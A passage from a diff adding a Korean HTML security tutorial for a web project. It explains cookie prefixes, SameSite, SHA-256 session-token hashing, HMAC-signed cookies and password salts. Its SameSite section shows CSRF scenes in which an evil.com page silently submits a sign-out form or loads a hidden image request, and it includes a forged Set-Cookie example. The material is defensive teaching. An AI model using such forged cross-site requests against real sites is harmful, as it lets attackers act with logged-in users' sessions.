+            HTTP 헤더의 <code>Max-Age</code>는 초 단위지만, Express의 <code>res.cookie</code> 옵션 <code>maxAge</code>는
+            밀리초다. Express가 초로 바꿔 헤더를 쓴다.
+          </p>
+          <div class="pipe">
+            <div class="pipe-row">
+              <span class="pipe-val">maxAge: 604800000<small>Express 옵션, 밀리초 (7일)</small></span>
+              <span class="pipe-fn">÷ 1000</span>
+              <span class="pipe-val ok">Max-Age=604800<small>HTTP 헤더, 초 (7일)</small></span>
+            </div>
+          </div>
+          <pre><code class="language-ts">res.cookie('sid', 'abc123', { maxAge: 7 * 24 * 60 * 60 * 1000 }); // Set-Cookie: sid=abc123; Max-Age=604800; ...</code></pre>
+        </section>
+
+        <section id="cookie-prefix">
+          <h2>쿠키 이름 접두사</h2>
+          <p>
+            쿠키 이름이 특정 접두사로 시작하면 브라우저가 속성을 강제로 검사한다. 조건에 맞지 않는 쿠키는 받아들이지
+            않는다. 다른 서브도메인이나 HTTP 페이지가 같은 이름의 쿠키를 덮어쓰는 공격을 막는다.
+          </p>
+          <div class="anatomy">
+            <span class="part warn" data-label="접두사: 브라우저가 검사">__Secure-</span><span
+              class="part green"
+              data-label="이 프로젝트의 쿠키 이름"
+              >openrun.session_token</span
+            >
+            <span class="anatomy-caption"
+              >운영 환경의 사용자 세션 쿠키 이름이다. 로컬은 http라 Secure를 쓸 수 없어 접두사 없이
+              <code>openrun.session_token</code>만 쓴다.</span
+            >
+          </div>
+          <p>
+            막으려는 공격은 이렇다. 공격자가 http 응답 하나를 조작할 수 있다면(같은 와이파이에서 http 요청을 가로채는
+            등), 그 응답에 같은 이름의 쿠키를 심어 진짜 세션 쿠키를 자기 값으로 바꿔치기할 수 있다.
+          </p>
+          <div class="pipe">
+            <div class="pipe-row">
+              <span class="pipe-label">접두사가 없을 때: 조작된 http 응답이 쿠키를 심는다</span>
+              <span class="pipe-val secret">Set-Cookie: sid=공격자값<small>http 응답, Secure 없음</small></span>
+              <span class="pipe-fn">브라우저 검사 없음</span>
+              <span class="pipe-val bad">받아들인다</span>
+              <span class="pipe-note">같은 이름이라 진짜 쿠키를 덮거나 섞인다</span>
+            </div>
+            <div class="pipe-row">
+              <span class="pipe-label">__Secure- 접두사가 있을 때</span>
+              <span class="pipe-val secret">Set-Cookie: __Secure-sid=공격자값<small>http 응답, Secure 없음</small></span>
+              <span class="pipe-fn">Secure이고 https에서 왔나?</span>
+              <span class="pipe-val ok">버린다</span>
+              <span class="pipe-note">조건을 못 맞추니 이름을 흉내 낼 수 없다</span>
+            </div>
+          </div>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>접두사</th>
+                  <th>브라우저가 요구하는 것</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td><code>__Secure-</code></td>
+                  <td><code>Secure</code> 속성이 있고, HTTPS 페이지에서 구웠다</td>
+                </tr>
+                <tr>
+                  <td><code>__Host-</code></td>
+                  <td>
+                    <code>__Secure-</code>의 조건에 더해 <code>Domain</code>이 없고(호스트 전용) <code>Path=/</code>다
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+          <p>
+            <code>__Host-</code>가 가장 엄격하지만 <code>Domain</code>을 쓸 수 없다. 여러 서브도메인이 함께 읽어야 하는
+            쿠키라면 <code>__Secure-</code>까지만 쓸 수 있다.
+          </p>
+          <p>
+            이 프로젝트의 사용자 세션 쿠키가 <code>__Host-</code>가 아니라 <code>__Secure-</code>인 이유도 이것이다.
+            배포에 따라 <code>COOKIE_DOMAIN</code>으로 <code>Domain</code>을 적어야 하기 때문이다
+            (<code>apps/api/src/users/user-session.ts</code>).
+          </p>
+        </section>
+
+        <section id="samesite">
+          <h2>SameSite</h2>
+          <p>
+            <code>SameSite</code>는 다른 <a href="#origin">사이트</a>에서 시작된 요청에 쿠키를 실을지 정한다.
+          </p>
+          <p>
+            "요청이 어디서 시작됐나"는 <strong>요청을 일으킨 페이지</strong>, 곧 그 순간 브라우저 주소창에 떠 있는 페이지를
+            말한다. 요청이 가는 곳은 늘 <code>example.com</code>으로 같다. 브라우저는 요청을 보낼 때마다 두 주소를 비교한다.
+          </p>
+          <ul>
+            <li><strong>요청을 일으킨 페이지의 사이트</strong>: 사용자가 지금 보고 있는 페이지</li>
+            <li><strong>요청이 가는 곳의 사이트</strong>: 쿠키의 주인인 <code>example.com</code></li>
+          </ul>
+          <p>둘이 같으면 같은 사이트 요청, 다르면 다른 사이트(cross-site) 요청이다.</p>
+          <div class="scenes">
+            <div class="scene">
+              <div class="scene-title">① 같은 사이트에서 버튼을 누른다</div>
+              <div class="scene-browser">
+                <div class="scene-url">https://<b>example.com</b>/shows</div>
+                <div class="scene-page">"내 예매" 버튼을 누른다</div>
+              </div>
+              <div class="scene-req">GET /me</div>
+              <div class="scene-server"><b>example.com</b><small>쿠키 주인</small></div>
+              <div class="scene-foot">
+                <span class="scene-verdict"><code>example.com</code> = <code>example.com</code> → <strong>같은 사이트</strong></span>
+                <ul class="scene-chips" data-legend="쿠키가 실리나"><li class="yes">Strict</li> <li class="yes">Lax</li> <li class="yes">None</li></ul>
+              </div>
+            </div>
+            <div class="scene">
+              <div class="scene-title">② 서브도메인끼리 부른다</div>
+              <div class="scene-browser">
+                <div class="scene-url">https://store.<b>example.com</b></div>
+                <div class="scene-page">페이지 자바스크립트가 API를 부른다</div>
+              </div>
+              <div class="scene-req">fetch GET /me</div>
+              <div class="scene-server">api.<b>example.com</b><small>쿠키 주인</small></div>
+              <div class="scene-foot">
+                <span class="scene-verdict">서브도메인은 보지 않는다 → <strong>같은 사이트</strong></span>
+                <ul class="scene-chips" data-legend="쿠키가 실리나"><li class="yes">Strict</li> <li class="yes">Lax</li> <li class="yes">None</li></ul>
+              </div>
+            </div>
+            <div class="scene cross">
+              <div class="scene-title">③ 검색 결과에서 링크를 눌러 들어온다</div>
+              <div class="scene-browser">
+                <div class="scene-url">https://search.<b>naver.com</b></div>
+                <div class="scene-page">검색 결과의 <code>example.com</code> 링크를 누른다</div>
+              </div>
+              <div class="scene-req">링크 이동 GET /</div>
+              <div class="scene-server"><b>example.com</b><small>쿠키 주인</small></div>
+              <div class="scene-foot">
+                <span class="scene-verdict"><code>naver.com</code> ≠ <code>example.com</code> → <strong>다른 사이트</strong>, 사용자가 직접 이동</span>
+                <ul class="scene-chips" data-legend="쿠키가 실리나"><li class="no">Strict</li> <li class="yes">Lax</li> <li class="yes">None</li></ul>
+              </div>
+            </div>
+            <div class="scene danger">
+              <div class="scene-title">④ 공격 페이지가 몰래 폼을 제출한다</div>
+              <div class="scene-browser">
+                <div class="scene-url">https://<b>evil.com</b>/free-gift</div>
+                <div class="scene-page">숨은 폼이 저절로 제출된다</div>
+              </div>
+              <div class="scene-req">폼 POST /auth/sign-out</div>
+              <div class="scene-server"><b>example.com</b><small>쿠키 주인</small></div>
+              <div class="scene-foot">
+                <span class="scene-verdict"><code>evil.com</code> ≠ <code>example.com</code> → <strong>다른 사이트</strong>, 사용자 몰래</span>
+                <ul class="scene-chips" data-legend="쿠키가 실리나"><li class="no">Strict</li> <li class="no">Lax</li> <li class="yes">None</li></ul>
+              </div>
+            </div>
+            <div class="scene danger">
+              <div class="scene-title">⑤ 공격 페이지가 이미지로 몰래 부른다</div>
+              <div class="scene-browser">
+                <div class="scene-url">https://<b>evil.com</b>/free-gift</div>
+                <div class="scene-page"><code>&lt;img src="https://example.com/me"&gt;</code>가 화면에 안 보이게 숨어 있다</div>
+              </div>
+              <div class="scene-req">img GET /me</div>
+              <div class="scene-server"><b>example.com</b><small>쿠키 주인</small></div>
+              <div class="scene-foot">
+                <span class="scene-verdict"><code>evil.com</code> ≠ <code>example.com</code> → <strong>다른 사이트</strong>, 이동이 아닌 GET</span>
+                <ul class="scene-chips" data-legend="쿠키가 실리나"><li class="no">Strict</li> <li class="no">Lax</li> <li class="yes">None</li></ul>
+              </div>
+            </div>
+          </div>
+          <p>
+            ④와 ⑤가 막아야 할 경우다. 사용자는 <code>example.com</code>에 로그인해 둔 채로 <code>evil.com</code>을 열었을
+            뿐인데, 그 페이지가 사용자 몰래 <code>example.com</code>으로 요청을 보낸다. 이 요청에 쿠키가 실리면 서버는
+            로그인한 사용자가 직접 보낸 요청으로 착각한다(<a href="#csrf">CSRF</a>). ③도 다른 사이트 요청이지만, 사용자가 직접
+            링크를 눌러 이동한 것이라 막을 이유가 없다. ③과 ⑤는 둘 다 GET이지만, ③은 주소창이 바뀌는 이동이고 ⑤는 페이지
+            안에서 몰래 일어나는 요청이라 <code>Lax</code>에서 결과가 갈린다. 정리하면 다음과 같다.
+          </p>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>다른 사이트에서 시작된 요청</th>
+                  <th><code>Strict</code></th>
+                  <th><code>Lax</code></th>
+                  <th><code>None</code></th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>링크를 눌러 이동 (최상위 GET)</td>
+                  <td>싣지 않는다</td>
+                  <td>싣는다</td>
+                  <td>싣는다</td>
+                </tr>
+                <tr>
+                  <td>폼 POST 제출</td>
+                  <td>싣지 않는다</td>
+                  <td>싣지 않는다</td>
+                  <td>싣는다</td>
+                </tr>
+                <tr>
+                  <td><code>fetch</code>, <code>&lt;img&gt;</code>, <code>&lt;iframe&gt;</code></td>
+                  <td>싣지 않는다</td>
+                  <td>싣지 않는다</td>
+                  <td>싣는다</td>
+                </tr>
+                <tr>
+                  <td>같은 사이트에서 시작된 요청</td>
+                  <td>싣는다</td>
+                  <td>싣는다</td>
+                  <td>싣는다</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+          <ul>
+            <li>
+              <strong><code>Strict</code></strong>는 가장 안전하지만, 메일이나 검색 결과의 링크를 눌러 들어와도 쿠키가 실리지
+              않는다. 로그인한 사용자가 첫 화면에서 로그아웃된 것처럼 보인다.
+            </li>
+            <li>
+              <strong><code>Lax</code></strong>는 링크로 이동하는 GET에만 싣는다. 이동은 허용하고, 상태를 바꾸는 POST는 막는
+              절충이다. 세션 쿠키에 흔히 쓴다. GET 요청이 상태를 바꾸지 않아야 이 보호가 성립한다.
+            </li>
+            <li>
+              <strong><code>None</code></strong>은 늘 싣는다. <code>Secure</code>와 함께 써야 한다. 다른 사이트에 끼워 넣는
+              위젯처럼 꼭 필요할 때만 쓴다.
+            </li>
+          </ul>
+          <p>
+            속성을 생략하면 Chrome은 <code>Lax</code>로 다룬다. 브라우저마다 기본값이 다를 수 있으니 직접 적는다.
+          </p>
+          <div class="callout warn">
+            <p>
+              <code>SameSite</code>는 <strong>사이트</strong>를 본다. <code>store.example.com</code>과
+              <code>admin.example.com</code>은 같은 사이트라, 한쪽이 다른 쪽으로 보내는 요청은 <code>Strict</code>여도
+              막지 않는다. 서브도메인 사이의 요청까지 구분하려면 <a href="#origin"><code>Origin</code></a> 검사가 필요하다.
+            </p>
+          </div>
+        </section>
+
+        <section id="hash">
+          <h2>해시 함수</h2>
+          <p>
+            해시 함수는 어떤 길이의 입력이든 정해진 길이의 "지문"으로 바꾼다. SHA-256은 늘 256비트(16진수 64자)를 낸다.
+          </p>
+          <pre><code class="language-ts">import { createHash } from 'node:crypto';
+
+createHash('sha256').update('hello').digest('hex');
+// '2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824'
+createHash('sha256').update('hellp').digest('hex');
+// 'fdd7585e08c4e2afd71dcabdb4636c89d557a3f42db9e2040c8bbd1708aa4ce7'
+// 한 글자만 달라도 완전히 다른 값이 된다</code></pre>
+          <p>암호에 쓰는 해시 함수에는 세 가지 성질이 있다.</p>
+          <ol class="steps blue">
+            <li><strong>같은 입력은 늘 같은 출력</strong> 그래서 저장해 둔 해시와 새로 계산한 해시를 비교할 수 있다.</li>
+            <li><strong>거꾸로 돌릴 수 없다</strong> 해시에서 원래 입력을 계산해 낼 방법이 없다. 찾으려면 입력을 하나씩 넣어 보는 수밖에 없다.</li>
+            <li><strong>충돌을 찾기 어렵다</strong> 같은 해시가 나오는 서로 다른 두 입력을 찾을 수 없다.</li>
+          </ol>
+          <p>
+            지문에 빗대면, 지문으로 그 사람인지 확인할 수는 있지만 지문만 보고 그 사람의 얼굴을 그려 낼 수는 없다. 그래서
+            DB에 원문 대신 해시를 두면, DB를 통째로 도둑맞아도 원문은 드러나지 않는다.
+          </p>
+          <h3>실제로 어떻게 쓰나: 세션 토큰</h3>
+          <p>
+            이 프로젝트에서 해시가 하는 일은 하나다. 로그인한 사용자에게 준 세션 토큰을 DB에 원문 그대로 두지 않는 것이다.
+            토큰은 <code>aB3xK9pQ</code>처럼 짧게 줄여 적는다(실제는 32자). 쿠키에 함께 붙는 서명은
+            <a href="#hmac">HMAC</a> 절에서 다루고 여기서는 뺀다.
+          </p>
+          <p><strong>① 로그인할 때: 원문은 브라우저에, 해시는 DB에</strong></p>
+          <div class="seq">
+            <ol class="seq-actors">
+              <li>브라우저</li>
+              <li>API 서버</li>
+              <li>DB</li>
+            </ol>
+            <ol class="seq-steps">
+              <li data-from="1" data-to="2">POST /auth/sign-in <small>이메일과 비밀번호</small></li>
+              <li data-at="2">무작위 토큰을 만든다 <small>aB3xK9pQ</small></li>
+              <li data-at="2">SHA-256으로 해시한다 <small>aB3xK9pQ → e4f493ea…</small></li>
+              <li data-from="2" data-to="3">sessions 행 저장 <small>token_hash = e4f493ea… (해시만)</small></li>
+              <li class="reply" data-from="2" data-to="1">200 <small>Set-Cookie: 토큰 원문 aB3xK9pQ</small></li>
+            </ol>
+          </div>
+          <p>
+            원문은 브라우저 쿠키에만 있고, DB에는 해시만 있다. 서버는 원문을 따로 기억하지 않는다.
+          </p>
+          <p><strong>② 다음 요청 때: 쿠키 값을 다시 해시해서 찾는다</strong></p>
+          <div class="seq">
+            <ol class="seq-actors">
+              <li>브라우저</li>
+              <li>API 서버</li>
+              <li>DB</li>
+            </ol>
+            <ol class="seq-steps">
+              <li data-from="1" data-to="2">GET /me <small>Cookie: aB3xK9pQ</small></li>
+              <li data-at="2">쿠키 값을 SHA-256으로 해시한다 <small>aB3xK9pQ → e4f493ea…</small></li>
+              <li data-from="2" data-to="3">token_hash = e4f493ea… 인 행을 찾는다</li>
+              <li class="reply" data-from="3" data-to="2">행이 있다 <small>user_id, 만료 시각</small></li>
+              <li class="reply" data-from="2" data-to="1">200 <small>로그인한 사용자 정보</small></li>
+            </ol>
+          </div>
+          <p>
+            성질 1(같은 입력은 늘 같은 출력) 덕분이다. 로그인 때 계산한 해시와 지금 계산한 해시가 같으니, 원문을 저장하지
+            않고도 같은 토큰인지 알 수 있다.
+          </p>
+          <p><strong>③ DB를 도둑맞았을 때: 해시로는 로그인할 수 없다</strong></p>
+          <div class="seq">
+            <ol class="seq-actors">
+              <li>공격자</li>
+              <li>API 서버</li>
+              <li>DB</li>
+            </ol>
+            <ol class="seq-steps">
+              <li class="seq-note">공격자가 DB 백업을 손에 넣어 e4f493ea…를 알아냈다</li>
+              <li class="stop" data-from="1" data-to="2">GET /me <small>Cookie: e4f493ea… (훔친 해시를 그대로 쿠키에)</small></li>
+              <li data-at="2">쿠키 값을 SHA-256으로 해시한다 <small>e4f493ea… → ae7e27cb… (전혀 다른 값)</small></li>
+              <li data-from="2" data-to="3">token_hash = ae7e27cb… 인 행을 찾는다</li>
+              <li class="reply stop" data-from="3" data-to="2">그런 행이 없다</li>
+              <li class="reply stop" data-from="2" data-to="1">401</li>
+            </ol>
+          </div>
+          <p>
+            서버는 받은 값을 늘 한 번 더 해시하므로, 해시를 그대로 보내면 해시의 해시가 되어 맞지 않는다. 통과하려면
+            해시 <code>e4f493ea…</code>가 나오는 원문 <code>aB3xK9pQ</code>를 알아내야 하는데, 성질 2(거꾸로 돌릴 수 없다)
+            때문에 그럴 수 없다. 원문을 그대로 저장했다면 공격자는 DB 값을 쿠키에 넣는 것만으로 모든 사용자로 로그인할 수
+            있었을 것이다.
+          </p>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th></th>
+                  <th>원문을 저장했다면</th>
+                  <th>해시를 저장하면</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>DB에 있는 값</td>
+                  <td><code>aB3xK9pQ</code></td>
+                  <td><code>e4f493ea…</code></td>
+                </tr>
+                <tr>
+                  <td>훔친 값을 쿠키에 넣으면</td>
+                  <td>그대로 로그인된다</td>
+                  <td>다시 해시되어 맞는 행이 없다</td>
+                </tr>
+                <tr>
+                  <td>서버가 같은 토큰인지 아는 법</td>
+                  <td>값을 그대로 비교</td>
+                  <td>쿠키 값을 해시해서 비교</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+          <p>
+            비밀번호도 같은 모양이다. 가입할 때 해시를 저장하고, 로그인할 때 입력값을 다시 해시해 비교한다. 다른 점은 아래
+            상자에 있다. 이 프로젝트의 실제 코드는 <a href="05-세션-토큰-만들기-서명-저장.html">05 세션 토큰</a>과
+            <a href="04-비밀번호-해시와-확인.html">04 비밀번호 해시</a>에서 본다.
+          </p>
+          <div class="callout warn">
+            <p>
+              "거꾸로 돌릴 수 없다"는 입력이 추측하기 어려울 때만 쓸모가 있다. 비밀번호처럼 사람이 고른 짧은 값은
+              흔한 후보를 넣어 보면 금방 맞는다. 그래서 비밀번호에는 SHA-256을 쓰지 않고 <a href="#kdf">느린 해시</a>를
+              쓴다. 반대로 충분히 긴 무작위 토큰은 넣어 볼 후보가 너무 많아 SHA-256 하나로 충분하다.
+            </p>
+          </div>
+        </section>
+
+        <section id="encryption">
+          <h2>암호화와 해시의 차이</h2>
+          <p>
+            암호화는 키가 있으면 <strong>되돌릴 수 있다</strong>. 해시는 누구도 되돌릴 수 없다. 자물쇠 달린 상자와 믹서기의
+            차이다. 자물쇠 상자는 열쇠만 있으면 넣은 물건을 그대로 꺼낼 수 있지만, 믹서기에 간 과일은 누구도 원래대로
+            되돌리지 못한다.
+          </p>
+          <div class="pipe">
+            <div class="pipe-row">
+              <span class="pipe-label">암호화: 키로 잠그고 같은 키로 연다</span>
+              <span class="pipe-val secret">4111-1111-1111-1111<small>카드 번호</small></span>
+              <span class="pipe-fn">암호화 (키)</span>
+              <span class="pipe-val">lmOygklMx9Iw94zG…<small>암호문, DB에 저장</small></span>
+              <span class="pipe-fn green">복호화 (같은 키)</span>
+              <span class="pipe-val ok">4111-1111-1111-1111<small>원문이 그대로 나온다</small></span>
+            </div>
+            <div class="pipe-row">
+              <span class="pipe-label">해시: 키가 없고, 한 방향으로만 간다</span>
+              <span class="pipe-val secret">password1<small>비밀번호</small></span>
+              <span class="pipe-fn">SHA-256</span>
+              <span class="pipe-val">0b14d501a594…<small>해시, DB에 저장</small></span>
+              <span class="pipe-fn blocked">되돌리기</span>
+              <span class="pipe-val bad">?<small>방법이 없다</small></span>
+            </div>
+          </div>
+          <p>
+            암호문 예시는 AES-256-GCM으로 실제 계산한 값의 앞부분이다. 키를 모르는 사람에게는 의미 없는 글자지만, 키를 가진
+            서버는 언제든 카드 번호를 다시 읽을 수 있다. 해시 쪽은 키를 가진 사람이 아예 없다.
+          </p>
+          <p>어느 쪽을 쓸지는 "서버가 나중에 원문을 다시 읽어야 하나?" 하나로 정한다.</p>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th></th>
+                  <th>암호화</th>
+                  <th>해시</th>
+                  <th><a href="#hmac">HMAC</a></th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>키</td>
+                  <td>있다</td>
+                  <td>없다</td>
+                  <td>있다</td>
+                </tr>
+                <tr>
+                  <td>원문으로 되돌리기</td>
+                  <td>키로 되돌린다</td>
+                  <td>불가능</td>
+                  <td>불가능 (원문은 보통 옆에 그대로 둔다)</td>
+                </tr>
+                <tr>
+                  <td>쓰는 곳</td>
+                  <td>나중에 다시 읽어야 하는 비밀 (카드 정보, 외부 서비스 토큰)</td>
+                  <td>맞는지 확인만 하면 되는 값 (비밀번호, 세션 토큰 저장)</td>
+                  <td>위조되지 않았는지 확인 (서명된 쿠키, 웹훅)</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+          <p>
+            비밀번호를 암호화해 저장하면 키를 가진 사람(또는 키를 훔친 사람)은 모든 비밀번호를 원문으로 읽을 수 있다.
+            서버는 비밀번호 원문을 다시 볼 일이 없으므로 해시가 맞다. "비밀번호 찾기"가 원래 비밀번호를 보여 주지 않고
+            재설정만 시키는 이유다.
+          </p>
+          <div class="callout">
+            <p>
+              어떤 사이트가 "비밀번호 찾기"로 원래 비밀번호를 메일로 보내 준다면, 그 사이트는 비밀번호를 암호화했거나 원문
+              그대로 저장했다는 뜻이다. 해시로 저장했다면 서버도 원문을 모른다.
+            </p>
+          </div>
+        </section>
+
+        <section id="hmac">
+          <h2>HMAC: 비밀키로 만든 서명</h2>
+          <p>
+            해시는 누구나 계산할 수 있다. 쿠키 값 옆에 그 값의 SHA-256을 붙여도, 쿠키를 바꾼 사람이 해시도 다시 계산해
+            붙이면 그만이다. HMAC은 서버만 아는 <strong>비밀키</strong>를 섞어 해시를 만든다. 키를 모르면 맞는 값을
+            계산할 수 없으므로, 서버는 "이 값은 내가 만든 그대로다"를 확인할 수 있다.
+          </p>
+          <pre><code class="language-ts">import { createHmac } from 'node:crypto';
+
+const secret = 'server-only-secret-at-least-32-chars';
+const value = 'user=42';
+const signature = createHmac('sha256', secret).update(value).digest('base64');
+const cookie = `${value}.${signature}`; // 'user=42.sH9/vw7Q35n/...'
+
+// 받을 때: 서명을 다시 계산해 비교한다. 값을 'user=1'로 바꾸면 서명이 맞지 않는다.</code></pre>
+          <div class="pipe">
+            <div class="pipe-row">
+              <span class="pipe-label">서명 만들기: 값과 비밀키를 함께 넣는다</span>
+              <span class="pipe-val">user=42<small>값</small></span>
+              <span class="pipe-note">+</span>
+              <span class="pipe-val secret">server-only-secret…<small>비밀키, 서버만 안다</small></span>
+              <span class="pipe-fn">HMAC-SHA256</span>
+              <span class="pipe-val">sH9/vw7Q35n/…<small>서명</small></span>
+            </div>
+            <div class="pipe-row">
+              <span class="pipe-label">키가 다르면 전혀 다른 서명이 나온다</span>
+              <span class="pipe-val">user=42</span>
+              <span class="pipe-note">+</span>
+              <span class="pipe-val">guess-secret<small>공격자가 짐작한 키</small></span>
+              <span class="pipe-fn">HMAC-SHA256</span>
+              <span class="pipe-val bad">7o0I2bslDi4g…<small>맞지 않는다</small></span>
+            </div>
+          </div>
+          <p>
+            봉투의 밀랍 도장과 같다. 도장이 깨지지 않았으면 왕이 봉한 그대로라고 믿을 수 있다. 하지만 봉투 겉에 적힌
+            글은 누구나 읽는다.
+          </p>
+
+          <h3>쿠키를 바꿔 보면</h3>
+          <p>
+            서버가 <code>user=42.sH9/vw7Q35n/…</code> 쿠키를 내려 줬다. 사용자가 이 쿠키를 고쳐 보내면 서버는 받은 값으로
+            서명을 다시 계산해 쿠키에 붙은 서명과 비교한다. 아래 값은 모두 실제로 계산했다.
+          </p>
+          <div class="pipe">
+            <div class="pipe-row">
+              <span class="pipe-label">① 그대로 보낸다</span>
+              <span class="pipe-val">user=42 . sH9/vw7Q…<small>받은 쿠키</small></span>
+              <span class="pipe-fn">HMAC(user=42)</span>
+              <span class="pipe-val ok">sH9/vw7Q…<small>붙은 서명과 같다 → 통과</small></span>
+            </div>
+            <div class="pipe-row">
+              <span class="pipe-label">② 값만 42 → 1로 바꾼다</span>
+              <span class="pipe-val">user=1 . sH9/vw7Q…</span>
+              <span class="pipe-fn">HMAC(user=1)</span>
+              <span class="pipe-val bad">jQ+ayxrqJBg3…<small>붙은 서명과 다르다 → 거절</small></span>
+            </div>
+            <div class="pipe-row">
+              <span class="pipe-label">③ 값을 바꾸고 SHA-256을 새로 계산해 붙인다</span>
+              <span class="pipe-val">user=1 . eOLdUjYc…<small>누구나 계산할 수 있는 해시</small></span>
+              <span class="pipe-fn">HMAC(user=1)</span>
+              <span class="pipe-val bad">jQ+ayxrqJBg3…<small>여전히 다르다 → 거절</small></span>
+            </div>
+          </div>
+          <p>
+            ③이 그냥 해시와 HMAC의 차이다. 서명이 SHA-256뿐이었다면 공격자가 <code>user=1</code>의 해시를 직접 계산해
+            붙여 통과했을 것이다. HMAC은 비밀키 없이 계산할 수 없으므로, 공격자가 맞는 서명 <code>jQ+ayxrq…</code>를 만들
+            방법이 없다.
+          </p>
+
+          <h3>실제로 어떻게 쓰나: 세션 쿠키</h3>
+          <p>이 프로젝트의 세션 쿠키 값은 토큰 뒤에 점과 서명을 붙인 모양이다. 토큰은 줄여 적었다(실제는 32자).</p>
+          <div class="anatomy">
+            <span class="part blue" data-label="토큰 (DB 조회 열쇠)">aB3xK9pQ</span
+            ><span class="part dim" data-label="구분">.</span
+            ><span class="part green" data-label="서명 = HMAC-SHA256(토큰, AUTH_SECRET)의 base64">pexhWn01T1j9VsnaL9kn…</span>
+            <span class="anatomy-caption">서버는 마지막 점을 기준으로 둘로 나눈다.</span>
+          </div>
+          <div class="seq">
+            <ol class="seq-actors">
+              <li>브라우저</li>
+              <li>API 서버</li>
+              <li>DB</li>
+            </ol>
+            <ol class="seq-steps">
+              <li data-from="1" data-to="2">GET /me <small>Cookie: aB3xK9pQ.pexhWn01…</small></li>
+              <li data-at="2">마지막 점으로 나눈다 <small>토큰 aB3xK9pQ, 서명 pexhWn01…</small></li>
+              <li data-at="2">AUTH_SECRET으로 서명을 다시 계산해 비교한다 <small>timingSafeEqual</small></li>
+              <li class="seq-note">서명이 다르면 여기서 끝난다. DB까지 가지 않고 401</li>
+              <li data-at="2">서명이 맞으면 토큰을 SHA-256으로 해시한다</li>
+              <li data-from="2" data-to="3">token_hash로 세션 행을 찾는다</li>
+            </ol>
+          </div>
+          <p>
+            서명은 아무렇게나 지어낸 쿠키를 DB 조회 전에 걸러 낸다. 토큰 자체는 무작위 값이라 읽혀도 의미가 없으므로,
+            여기서는 숨길 필요 없이 위조만 막으면 된다. 실제 코드는
+            <a href="05-세션-토큰-만들기-서명-저장.html">05 세션 토큰</a>에서 본다.
+          </p>
+          <div class="callout warn">
+            <p>
+              HMAC은 <strong>숨기지 않는다</strong>. 위 쿠키의 <code>user=42</code>는 누구나 읽는다. 서명이 보장하는 것은
+              "바꾸지 않았다"뿐이다. 숨겨야 하는 값이면 암호화하거나, 아예 의미 없는 무작위 값을 쓴다.
+            </p>
+          </div>
+          <p>
+            비밀키가 짧거나 추측 가능하면 공격자가 키 후보를 넣어 보며 맞는 서명을 찾을 수 있다. 키는 충분히 긴 무작위
+            문자열로 만든다(예: <code>openssl rand -base64 32</code>).
+          </p>
+        </section>
+
+        <section id="salt">
+          <h2>솔트</h2>
+          <p>
+            같은 비밀번호는 같은 해시가 된다. 그러면 두 가지 문제가 생긴다.
+          </p>
+          <ul>
+            <li>DB에서 해시가 같은 사용자들은 비밀번호가 같다는 것이 드러난다.</li>
+            <li>
+              공격자가 흔한 비밀번호 수억 개의 해시를 미리 계산해 표로 만들어 두면(레인보우 테이블), 훔친 해시를 표에서
+              찾기만 하면 된다.
+            </li>
+          </ul>
+          <div class="pipe">
+            <div class="pipe-row">
+              <span class="pipe-label">솔트 없이: 사용자 A와 B가 둘 다 password1</span>
+              <span class="pipe-val secret">password1<small>A</small></span>
+              <span class="pipe-fn">SHA-256</span>
+              <span class="pipe-val bad">0b14d501a594…</span>
+            </div>
+            <div class="pipe-row">
+              <span class="pipe-val secret">password1<small>B</small></span>
+              <span class="pipe-fn">SHA-256</span>
+              <span class="pipe-val bad">0b14d501a594…</span>
+              <span class="pipe-note">A와 똑같다. 둘의 비밀번호가 같다는 것이 드러난다</span>
+            </div>
+            <div class="pipe-row">
+              <span class="pipe-label">공격자가 미리 만들어 둔 표</span>
+              <span class="pipe-val">0b14d501a594…</span>
+              <span class="pipe-fn">표에서 찾기</span>
+              <span class="pipe-val bad">password1</span>
+              <span class="pipe-note">계산 없이 바로 찾는다</span>
+            </div>
+          </div>
+          <p>
+            <strong>솔트</strong>는 사용자마다 새로 뽑는 무작위 값이다. 비밀번호에 솔트를 섞어 해시하면, 같은 비밀번호도
+            사용자마다 다른 해시가 된다. 미리 만든 표는 쓸모가 없어지고, 공격자는 사용자 한 명 한 명을 따로 공격해야
+            한다.
+          </p>
+          <div class="pipe">
+            <div class="pipe-row">
+              <span class="pipe-label">솔트를 섞으면: 같은 password1도 결과가 다르다</span>
+              <span class="pipe-val secret">password1<small>A</small></span>
+              <span class="pipe-note">+</span>
+              <span class="pipe-val">9f2c41d0…<small>A의 솔트</small></span>
+              <span class="pipe-fn">scrypt</span>
+              <span class="pipe-val ok">f79c642d5da7…</span>
+            </div>
+            <div class="pipe-row">
+              <span class="pipe-val secret">password1<small>B</small></span>
+              <span class="pipe-note">+</span>
+              <span class="pipe-val">3b7e0c92…<small>B의 솔트</small></span>
+              <span class="pipe-fn">scrypt</span>
+              <span class="pipe-val ok">3f72210fd925…</span>
+              <span class="pipe-note">A와 전혀 다르다</span>
+            </div>
+          </div>
+          <p>
+            위 값은 이 프로젝트와 같은 scrypt 설정으로 실제 계산했다. 공격자가 표를 미리 만들려면 솔트마다 표를 따로 만들어야
+            하는데, 솔트는 16바이트(2<sup>128</sup>가지)라 불가능하다.
+          </p>
+          <p>
+            솔트는 비밀이 아니다. 확인할 때 같은 솔트로 다시 계산해야 하므로 해시 옆에 그대로 저장한다. 솔트의 역할은
+            숨는 것이 아니라 사용자마다 다른 것이다. 이 프로젝트는 <code>솔트:키</code> 모양의 문자열 하나로 저장한다.
+          </p>
+          <div class="anatomy">
+            <span class="part blue" data-label="솔트 16바이트 (hex 32자)">9f2c41d07a3be8156c0e4d92ab37f105</span
+            ><span class="part dim" data-label="구분">:</span
